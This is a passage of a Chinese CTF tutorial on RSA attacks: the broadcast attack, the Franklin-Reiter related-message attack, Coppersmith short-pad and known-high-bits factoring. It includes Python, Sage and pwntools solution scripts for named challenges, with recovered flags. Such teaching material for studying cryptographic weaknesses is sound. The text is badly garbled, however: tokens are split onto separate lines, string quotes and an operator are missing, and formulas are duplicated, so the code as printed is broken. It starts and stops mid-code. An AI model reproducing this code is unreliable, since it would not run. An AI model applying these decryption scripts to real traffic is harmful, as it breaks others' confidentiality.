\nreturn\n \nint\n(\nsum\n \n%\n \nprod\n)\n\n\n\n\nnset\n \n=\n \n[]\n\n\ncset\n \n=\n \n[]\n\n\nwith\n \nopen\n(\ndata.txt\n)\n \nas\n \nf\n:\n\n    \nnow\n \n=\n \nf\n.\nread\n()\n.\nstrip\n(\n\\n\n)\n.\nsplit\n(\n\\n\n)\n\n    \nfor\n \nitem\n \nin\n \nnow\n:\n\n        \nitem\n \n=\n \nitem\n.\nsplit\n(\n,\n)\n\n        \nnset\n.\nappend\n(\nint\n(\nitem\n[\n0\n]))\n\n        \ncset\n.\nappend\n(\nint\n(\nitem\n[\n1\n]))\n\n\n\nm\n \n=\n \nchinese_remainder\n(\nnset\n,\n \ncset\n)\n\n\nm\n \n=\n \nint\n(\ngmpy\n.\nmpz\n(\nm\n)\n.\nroot\n(\n19\n)[\n0\n])\n\n\nprint\n \nbinascii\n.\nunhexlify\n(\nhex\n(\nm\n)[\n2\n:\n-\n1\n])\n\n\n\n\n\n\u5f97\u5230\u5bc6\u6587\uff0c\u7136\u540e\u518d\u6b21\u89e3\u5bc6\u5373\u53ef\u5f97\u5230 flag\u3002\n\n\nH1sTaDs_B40aDcadt_attaCk_e_are_same_and_smA9l\n\n\n\n\n\u9898\u76ee\n\n\n\n\n2017 WHCTF OldDriver\n\n\n2018 N1CTF easy_fs\n\n\n\n\nBroadcast Attack with Linear Padding\n\n\n\u5bf9\u4e8e\u5177\u6709\u7ebf\u6027\u586b\u5145\u7684\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u53ef\u4ee5\u653b\u51fb\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u4f7f\u7528 \nCoppersmith method\n \u7684\u65b9\u6cd5\u4e86\uff0c\u8fd9\u91cc\u6682\u4e0d\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003\n\n\n\n\nhttps://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations\n\n\n\n\nRelated Message Attack\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u5f53 Alice \u4f7f\u7528\u540c\u4e00\u516c\u94a5\u5bf9\u4e24\u4e2a\u5177\u6709\u67d0\u79cd\u7ebf\u6027\u5173\u7cfb\u7684\u6d88\u606f M1 \u4e0e M2 \u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u540e\u7684\u6d88\u606f C1\uff0cC2 \u53d1\u9001\u7ed9\u4e86 Bob \u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u83b7\u5f97\u5bf9\u5e94\u7684\u6d88\u606f M1 \u4e0e M2\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570\u4e3a N\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u7ebf\u6027\u5173\u7cfb\u5982\u4e0b\n\n\n\n\n\nM_1 \\equiv f(M_2) \\bmod N\n\n\n\n\nM_1 \\equiv f(M_2) \\bmod N\n\n\n\n\n\n\u5176\u4e2d f \u4e3a\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570\uff0c\u6bd4\u5982\u8bf4 \nf=ax+b\nf=ax+b\n\u3002\n\n\n\u5728\u5177\u6709\u8f83\u5c0f\u9519\u8bef\u6982\u7387\u4e0b\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u590d\u6742\u5ea6\u4e3a \nO(elog^2N)\nO(elog^2N)\n\u3002\n\n\n\u8fd9\u4e00\u653b\u51fb\u7531 Franklin\uff0cReiter \u63d0\u51fa\u3002\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u77e5\u9053 \nC_1 \\equiv M_1 ^e \\bmod N\nC_1 \\equiv M_1 ^e \\bmod N\n\uff0c\u5e76\u4e14 \nM_1 \\equiv f(M_2) \\bmod N\nM_1 \\equiv f(M_2) \\bmod N\n\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 \nM_2\nM_2\n \u662f \nf(x)^e \\equiv C_1 \\bmod N\nf(x)^e \\equiv C_1 \\bmod N\n \u7684\u4e00\u4e2a\u89e3\uff0c\u5373\u5b83\u662f\u65b9\u7a0b \nf(x)^e-C_1\nf(x)^e-C_1\n \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u540c\u6837\u7684\uff0c\nM_2\nM_2\n \u662f \nx^e - C_2\nx^e - C_2\n \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u6240\u4ee5\u8bf4 \nx-M_2\nx-M_2\n \u540c\u65f6\u6574\u9664\u4ee5\u4e0a\u4e24\u4e2a\u591a\u9879\u5f0f\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u4e24\u4e2a\u591a\u9879\u5f0f\u7684\u6700\u5927\u516c\u56e0\u5b50\uff0c\u5982\u679c\u6700\u5927\u516c\u56e0\u5b50\u6070\u597d\u662f\u7ebf\u6027\u7684\u8bdd\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 \nM_2\nM_2\n\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 \ne=3\ne=3\n \u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u5927\u516c\u56e0\u5b50\u4e00\u5b9a\u662f\u7ebf\u6027\u7684\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e00\u4e0b \ne=3\ne=3\n\uff0c\u4e14 \nf(x)=ax+b\nf(x)=ax+b\n \u7684\u60c5\u51b5\u3002\u9996\u5148\u6211\u4eec\u6709\n\n\n\n\n\nC_1 \\equiv M_1 ^3 \\bmod N$ \u4e14$M_1 \\equiv aM_2+b \\bmod N\n\n\n\n\nC_1 \\equiv M_1 ^3 \\bmod N$ \u4e14$M_1 \\equiv aM_2+b \\bmod N\n\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u6709\n\n\n\n\n\nC_1 \\equiv (aM_2+b)^3 \\bmod N$ \u4e14$C_2 \\equiv M_2^3 \\bmod N\n\n\n\n\nC_1 \\equiv (aM_2+b)^3 \\bmod N$ \u4e14$C_2 \\equiv M_2^3 \\bmod N\n\n\n\n\n\n\u6211\u4eec\u9700\u8981\u660e\u786e\u4e00\u4e0b\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684\u662f\u6d88\u606f m\uff0c\u6240\u4ee5\u9700\u8981\u5c06\u5176\u5355\u72ec\u6784\u9020\u51fa\u6765\u3002\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6709\u5f0f 1\n\n\n\n\n\n(aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3\n\n\n\n\n(aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3\n\n\n\n\n\n\u518d\u8005\u6211\u4eec\u6784\u9020\u5982\u4e0b\u5f0f 2\n\n\n\n\n\n(aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N\n\n\n\n\n(aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N\n\n\n\n\n\n\u6839\u636e\u5f0f 1 \u6211\u4eec\u6709\n\n\n\n\n\na^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N\n\n\n\n\na^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N\n\n\n\n\n\n\u7ee7\u800c\u6211\u4eec\u6709\u5f0f 3\n\n\n\n\n\n3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N\n\n\n\n\n3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N\n\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u6839\u636e\u5f0f 2 \u4e0e\u5f0f 3 \u53ef\u5f97\n\n\n\n\n\n(a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N\n\n\n\n\n(a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N\n\n\n\n\n\n\u8fdb\u800c\u6211\u4eec\u6709\n\n\n\n\n\naM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3}\n\n\n\n\naM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3}\n\n\n\n\n\n\u8fdb\u800c\n\n\n\n\n\naM_2\\equiv  \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3}\n\n\n\n\naM_2\\equiv  \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3}\n\n\n\n\n\n\u8fdb\u800c\n\n\n\n\n\nM_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3}\n\n\n\n\nM_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3}\n\n\n\n\n\n\u4e0a\u9762\u7684\u5f0f\u5b50\u4e2d\u53f3\u8fb9\u6240\u6709\u7684\u5185\u5bb9\u90fd\u662f\u5df2\u77e5\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u6d88\u606f\u3002\n\n\n\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u8fdb\u4e00\u6b65\u9605\u8bfb \nA New Related Message Attack on RSA\n \u4ee5\u53ca \npaper\n \u8fd9\u91cc\u6682\u4e0d\u505a\u8fc7\u591a\u7684\u8bb2\u89e3\u3002\n\n\nSCTF RSA3\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u8ddf\u8e2a TCP \u6d41\u53ef\u4ee5\u77e5\u9053\uff0c\u52a0\u5bc6\u65b9\u5f0f\u662f\u5c06\u660e\u6587\u52a0\u4e0a\u7528\u6237\u7684 user id \u8fdb\u884c\u52a0\u5bc6\uff0c\u800c\u4e14\u8fd8\u5b58\u5728\u591a\u7ec4\u3002\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u7b2c 0 \u7ec4\u548c\u7b2c 9 \u7ec4\uff0c\u4ed6\u4eec\u7684\u6a21\u6570\u4e00\u6837\uff0c\u89e3\u5bc6\u811a\u672c\u5982\u4e0b\n\n\nimport\n \ngmpy2\n\n\nid1\n \n=\n \n1002\n\n\nid2\n \n=\n \n2614\n\n\n\nc1\n \n=\n \n0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718\nL\n\n\nc2\n \n=\n \n0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08\nL\n\n\nn\n \n=\n \n25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553\n\n\na\n \n=\n \n1\n\n\nb\n \n=\n \nid1\n \n-\n \nid2\n\n\n\n\ndef\n \ngetmessage\n(\na\n,\n \nb\n,\n \nc1\n,\n \nc2\n,\n \nn\n):\n\n    \nb3\n \n=\n \ngmpy2\n.\npowmod\n(\nb\n,\n \n3\n,\n \nn\n)\n\n    \npart1\n \n=\n \nb\n \n*\n \n(\nc1\n \n+\n \n2\n \n*\n \nc2\n \n-\n \nb3\n)\n \n%\n \nn\n\n    \npart2\n \n=\n \na\n \n*\n \n(\nc1\n \n-\n \nc2\n \n+\n \n2\n \n*\n \nb3\n)\n \n%\n \nn\n\n    \npart2\n \n=\n \ngmpy2\n.\ninvert\n(\npart2\n,\n \nn\n)\n\n    \nreturn\n \npart1\n \n*\n \npart2\n \n%\n \nn\n\n\n\n\nmessage\n \n=\n \ngetmessage\n(\na\n,\n \nb\n,\n \nc1\n,\n \nc2\n,\n \nn\n)\n \n-\n \nid2\n\n\nmessage\n \n=\n \nhex\n(\nmessage\n)[\n2\n:]\n\n\nif\n \nlen\n(\nmessage\n)\n \n%\n \n2\n \n!=\n \n0\n:\n\n    \nmessage\n \n=\n \n0\n \n+\n \nmessage\n\n\n\nprint\n \nmessage\n.\ndecode\n(\nhex\n)\n\n\n\n\n\n\u5f97\u5230\u660e\u6587\n\n\n\u279c  sctf-rsa3-level3 git:\n(\nmaster\n)\n \u2717 python exp.py\nF4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL\n\n\n\n\n\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sage \u6765\u505a\uff0c\u4f1a\u66f4\u52a0\u7b80\u5355\u4e00\u70b9\u3002\n\n\nimport\n \nbinascii\n\n\n\ndef\n \nattack\n(\nc1\n,\n \nc2\n,\n \nb\n,\n \ne\n,\n \nn\n):\n\n    \nPR\n.\nx\n=\nPolynomialRing\n(\nZmod\n(\nn\n))\n\n    \ng1\n \n=\n \nx\n^\ne\n \n-\n \nc1\n\n    \ng2\n \n=\n \n(\nx\n+\nb\n)\n^\ne\n \n-\n \nc2\n\n\n    \ndef\n \ngcd\n(\ng1\n,\n \ng2\n):\n\n        \nwhile\n \ng2\n:\n\n            \ng1\n,\n \ng2\n \n=\n \ng2\n,\n \ng1\n \n%\n \ng2\n\n        \nreturn\n \ng1\n.\nmonic\n()\n\n    \nreturn\n \n-\ngcd\n(\ng1\n,\n \ng2\n)[\n0\n]\n\n\n\nc1\n \n=\n \n0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718\nL\n\n\nc2\n \n=\n \n0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08\nL\n\n\nn\n \n=\n \n25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553\n\n\ne\n=\n3\n\n\na\n \n=\n \n1\n\n\nid1\n \n=\n \n1002\n\n\nid2\n \n=\n \n2614\n\n\nb\n \n=\n \nid2\n \n-\n \nid1\n\n\nm1\n \n=\n \nattack\n(\nc1\n,\nc2\n,\n \nb\n,\ne\n,\nn\n)\n\n\nprint\n \nbinascii\n.\nunhexlify\n(\n%x\n \n%\n \nint\n(\nm1\n \n-\n \nid1\n))\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  sctf-rsa3-level3 git:\n(\nmaster\n)\n \u2717 sage exp.sage\nsys:1: RuntimeWarning: not adding directory \n to sys.path since everybody can write to it.\nUntrusted users could put files in this directory which might \nthen\n be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory\nF4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL\n\n\n\n\n\u9898\u76ee\n\n\n\n\nhitcon 2014 rsaha\n\n\nN1CTF 2018 rsa_padding\n\n\n\n\nCoppersmith\u2019s short-pad attack\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u76ee\u524d\u5728\u5927\u90e8\u5206\u6d88\u606f\u52a0\u5bc6\u4e4b\u524d\u90fd\u4f1a\u8fdb\u884c padding\uff0c\u4f46\u662f\u5982\u679c padding \u7684\u957f\u5ea6\u8fc7\u77ed\uff0c\u4e5f\u6709\n\u53ef\u80fd\n\u88ab\u5f88\u5bb9\u6613\u5730\u653b\u51fb\u3002\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u6211\u4eec\u5047\u8bbe\u7231\u4e3d\u4e1d\u8981\u7ed9\u9c8d\u52c3\u53d1\u9001\u6d88\u606f\uff0c\u9996\u5148\u7231\u4e3d\u4e1d\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C1\uff0c\u53d1\u9001\u7ed9\u9c8d\u52c3\u3002\u8fd9\u65f6\uff0c\u4e2d\u95f4\u4eba\u76ae\u7279\u622a\u83b7\u4e86\u5bc6\u6587\u3002\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u7231\u4e3d\u4e1d\u6ca1\u6709\u6536\u5230\u9c8d\u52c3\u7684\u56de\u590d\uff0c\u518d\u6b21\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C2\uff0c\u53d1\u9001\u7ed9 Bob\u3002\u76ae\u7279\u518d\u4e00\u6b21\u622a\u83b7\u3002\u8fd9\u65f6\uff0c\u76ae\u7279\u5c31\n\u53ef\u80fd\n\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u539f\u7406\u89e3\u5bc6\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570 N \u7684\u957f\u5ea6\u4e3a k\uff0c\u5e76\u4e14 padding \u7684\u957f\u5ea6\u4e3a \nm=\\lfloor \\frac{k}{e^2} \\rfloor\nm=\\lfloor \\frac{k}{e^2} \\rfloor\n\u3002\u6b64\u5916\uff0c\u5047\u8bbe\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u7684\u957f\u5ea6\u6700\u591a\u4e3a k-m \u6bd4\u7279\uff0cpadding \u7684\u65b9\u5f0f\u5982\u4e0b\n\n\n\n\n\nM_1=2^mM+r_1, 0\\leq r_1\\leq 2^m\n\n\n\n\nM_1=2^mM+r_1, 0\\leq r_1\\leq 2^m\n\n\n\n\n\n\u6d88\u606f M2 \u7684 padding \u65b9\u5f0f\u7c7b\u4f3c\u3002\n\n\n\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u89e3\u5bc6\u3002\n\n\n\u9996\u5148\u5b9a\u4e49\n\n\n\n\n\ng_1(x,y)=x^e-C_1\ng_2(x,y)=(x+y)^e-C_2\n\n\n\n\ng_1(x,y)=x^e-C_1\ng_2(x,y)=(x+y)^e-C_2\n\n\n\n\n\n\u5176\u4e2d \ny=r_2-r_1\ny=r_2-r_1\n\u3002\u663e\u7136\u8fd9\u4e24\u4e2a\u65b9\u7a0b\u5177\u6709\u76f8\u540c\u7684\u6839 M1\u3002\u7136\u540e\u8fd8\u6709\u4e00\u7cfb\u5217\u7684\u63a8\u5bfc\u3002\n\n\nKnown High Bits Message Attack\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u9996\u5148\u52a0\u5bc6\u4e86\u6d88\u606f m\uff0c\u5982\u4e0b\n\n\n\n\n\nC\\equiv m^d \\bmod N\n\n\n\n\nC\\equiv m^d \\bmod N\n\n\n\n\n\n\u5e76\u4e14\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u77e5\u9053\u6d88\u606f m \u7684\u5f88\u5927\u7684\u4e00\u90e8\u5206 \nm_0\nm_0\n\uff0c\u5373 \nm=m_0+x\nm=m_0+x\n\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 \nx\nx\n\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u8be5\u65b9\u6cd5\u8fdb\u884c\u6062\u590d\u6d88\u606f\u3002\n\n\n\u53ef\u4ee5\u53c2\u8003 \nhttps://github.com/mimoo/RSA-and-LLL-attacks\n\u3002\n\n\nFactoring with High Bits Known\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u5f53\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u516c\u94a5\u4e2d\u6a21\u6570 N \u7684\u4e00\u4e2a\u56e0\u5b50\u7684\u8f83\u9ad8\u4f4d\u65f6\uff0c\u6211\u4eec\u5c31\u6709\u4e00\u5b9a\u51e0\u7387\u6765\u5206\u89e3 N\u3002\n\n\n\u653b\u51fb\u5de5\u5177\n\n\n\u8bf7\u53c2\u8003 \nhttps://github.com/mimoo/RSA-and-LLL-attacks\n\u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002\u5173\u6ce8\u4e0b\u9762\u7684\u4ee3\u7801\n\n\nbeta\n \n=\n \n0.5\n\n\ndd\n \n=\n \nf\n.\ndegree\n()\n\n\nepsilon\n \n=\n \nbeta\n \n/\n \n7\n\n\nmm\n \n=\n \nceil\n(\nbeta\n**\n2\n \n/\n \n(\ndd\n \n*\n \nepsilon\n))\n\n\ntt\n \n=\n \nfloor\n(\ndd\n \n*\n \nmm\n \n*\n \n((\n1\n/\nbeta\n)\n \n-\n \n1\n))\n\n\nXX\n \n=\n \nceil\n(\nN\n**\n((\nbeta\n**\n2\n/\ndd\n)\n \n-\n \nepsilon\n))\n \n+\n \n1000000000000000000000000000000000\n\n\nroots\n \n=\n \ncoppersmith_howgrave_univariate\n(\nf\n,\n \nN\n,\n \nbeta\n,\n \nmm\n,\n \ntt\n,\n \nXX\n)\n\n\n\n\n\n\u5176\u4e2d\uff0c\n\n\n\n\n\u5fc5\u987b\u6ee1\u8db3 \nq\\geq N^{beta}\nq\\geq N^{beta}\n\uff0c\u6240\u4ee5\u8fd9\u91cc\u7ed9\u51fa\u4e86\nbeta=0.5\nbeta=0.5\n\uff0c\u663e\u7136\u4e24\u4e2a\u56e0\u6570\u4e2d\u5fc5\u7136\u6709\u4e00\u4e2a\u662f\u5927\u4e8e\u7684\u3002\n\n\nXX \u662f $f(x)=q'+x $\u5728\u6a21 q \u610f\u4e49\u4e0b\u7684\u6839\u7684\u4e0a\u754c\uff0c\u81ea\u7136\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u8c03\u6574\u5b83\uff0c\u8fd9\u91cc\u5176\u5b9e\u4e5f\u8868\u660e\u4e86\u6211\u4eec\u5df2\u77e5\u7684 \nq'\nq'\n \u4e0e\u56e0\u6570 q \u4e4b\u95f4\u53ef\u80fd\u7684\u5dee\u8ddd\u3002\n\n\n\n\n\u4f8b\u9898\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d\u7684 RSA2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\u9996\u5148\u7a0b\u5e8f\u7684\u5f00\u5934\u662f\u4e00\u4e2a\u7ed5\u8fc7\u9a8c\u8bc1\u7684\uff0c\u7ed5\u8fc7\u5373\u53ef\uff0c\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nhashlib\n \nimport\n \nsha512\n\n\nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ndef\n \nsha512_proof\n(\nprefix\n,\n \nverify\n):\n\n    \ni\n \n=\n \n0\n\n    \npading\n \n=\n \n\n    \nwhile\n \nTrue\n:\n\n        \ntry\n:\n\n            \ni\n \n=\n \nrandint\n(\n0\n,\n \n1000\n)\n\n            \npading\n \n+=\n \nstr\n(\ni\n)\n\n            \nif\n \nlen\n(\npading\n)\n \n \n200\n:\n\n                \npading\n \n=\n \npading\n[\n200\n:]\n\n            \n#print pading\n\n        \nexcept\n \nStopIteration\n:\n\n            \nbreak\n\n        \nr\n \n=\n \nsha512\n(\nprefix\n \n+\n \npading\n)\n.\nhexdigest\n()\n\n        \nif\n \nverify\n \nin\n \nr\n:\n\n            \nreturn\n \npading\n\n\n\n\ndef\n \nverify\n():\n\n    \nsh\n.\nrecvuntil\n(\nPrefix: \n)\n\n    \nprefix\n \n=\n \nsh\n.\nrecvline\n()\n\n    \nprint\n \nlen\n(\nprefix\n)\n\n    \nprefix\n \n=\n \nprefix\n[:\n-\n1\n]\n\n    \nprefix\n \n=\n \nprefix\n.\ndecode\n(\nbase64\n)\n\n    \nproof\n \n=\n \nsha512_proof\n(\nprefix\n,\n \nfffffff\n)\n\n    \nsh\n.\nsend\n(\nproof\n.\nencode\n(\nbase64\n))\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nverify\n()\n\n    \nprint\n \nverify success\n\n    \nsh\n.\nrecvuntil\n(\ntoken: \n)\n\n    \ntoken\n \n=\n \n5c9597f3c8245907ea71a89d9d39d08e\n\n    \nsh\n.\nsendline\n(\ntoken\n)\n\n\n    \nsh\n.\nrecvuntil\n(\nn: \n)\n\n    \nn\n \n=\n \nsh\n.\nreadline\n()\n.\nstrip\n()\n\n    \nn\n \n=\n \nint\n(\nn\n[\n2\n:],\n \n16\n)\n\n\n    \nsh\n.\nrecvuntil\n(\ne: \n)\n\n    \ne\n \n=\n \nsh\n.\nreadline\n()\n.\nstrip\n()\n\n    \ne\n \n=\n \nint\n(\ne\n[\n2\n:],\n \n16\n)\n\n\n    \nsh\n.\nrecvuntil\n(\ne2: \n)\n\n    \ne2\n \n=\n \nsh\n.\nreadline\n()\n.\nstrip\n()\n\n    \ne2\n \n=\n \nint\n(\ne2\n[\n2\n:],\n \n16\n)\n\n\n    \nsh\n.\nrecvuntil\n(\nis: \n)\n\n    \nenc_flag\n \n=\n \nsh\n.\nreadline\n()\n.\nstrip\n()\n\n    \nenc_flag\n \n=\n \nint\n(\nenc_flag\n[\n2\n:\n-\n1\n],\n \n16\n)\n\n    \nprint\n \nn: \n,\n \nhex\n(\nn\n)\n\n    \nprint\n \ne: \n,\n \nhex\n(\ne\n)\n\n    \nprint\n \ne2: \n,\n \nhex\n(\ne2\n)\n\n    \nprint\n \nflag: \n,\n \nhex\n(\nenc_flag\n)\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e5f\u5df2\u7ecf\u5f97\u5230 n\uff0ce\uff0ce2\uff0c\u52a0\u5bc6\u540e\u7684 flag \u4e86\uff0c\u5982\u4e0b\n\n\nn\n:\n  \n0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f\n\n\ne\n:\n  \n0x10001\n\n\ne2\n:\n  \n0xf93b\n\n\nflag\n:\n  \n0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8\n\n\n\n\n\n\u63a5\u4e0b\u6765\u6211\u4eec\u6765\u5206\u6790\u4e3b\u7a0b\u5e8f\u3002\u53ef\u4ee5\u770b\u51fa\n\n\n    \np\n,\n \nq\n,\n 